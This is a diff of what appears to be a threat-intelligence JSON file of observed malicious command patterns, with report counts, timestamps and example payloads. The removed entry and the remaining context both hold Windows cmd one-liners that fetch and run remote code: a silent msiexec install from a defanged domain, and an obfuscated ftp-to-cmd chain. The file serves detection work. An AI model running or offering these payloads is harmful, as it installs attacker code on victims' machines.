@@ -1153,19 +1153,6 @@
     ]
   },
   {
-    "Pattern": "cmd /c \"curl -s -o NUL <URL> & msiexec /q /i <URL>\"",
-    "DistinctPayloadCount": 1,
-    "ReportCount": 1,
-    "FirstSeen": "2026-11-12T02:59:24.496000+00:00",
-    "LastSeen": "2026-11-12T02:59:24.496000+00:00",
-    "ReportIds": [
-      "cmwcylu3c0fav0oml4xhetl84"
-    ],
-    "PayloadExamples": [
-      "cmd /c \"curl -s -o NUL https://xedplay[.]com/verify.php?t=7fe13fa4dc9efc264de91e0508e89fb6 & msiexec /q /i https://distnode[.]biz/radar-cover-probe/named\""
-    ]
-  },
-  {
     "Pattern": "cmd /c set \"spain=ftp\"&set \"italy=report-ftp.wiki\"&set \"greek=| \"&set \"polan=for /f %m in ('dir /b /s %windir%\\System32\\cm?.e??') do %m\"&start \"\" /min cmd /c \"%spain% %italy% %greek%%polan%\"",
     "DistinctPayloadCount": 1,
     "ReportCount": 1,
